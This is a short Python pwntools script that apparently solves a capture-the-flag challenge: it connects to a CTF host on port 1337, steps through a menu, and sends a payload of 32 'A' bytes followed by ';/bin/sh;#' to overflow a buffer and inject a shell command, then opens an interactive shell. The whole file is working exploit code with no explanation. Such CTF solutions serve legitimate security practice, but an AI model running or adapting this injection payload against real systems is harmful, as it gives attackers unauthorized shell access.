from pwn import *

p = remote("otis-10-180.chall.ctf.bzh", 1337)

p.recvuntil(b"> ")

p.sendline(b'n')
p.recvuntil(b"> ")

p.sendline(b'v')
p.recvuntil(b"> ")

p.sendline(b'm')
p.recvuntil(b"Message : ")

payload = b'A' * 32
payload += b";/bin/sh;#"

p.sendline(payload)
p.recvuntil(b"> ")

p.sendline(b'r')

p.interactive()
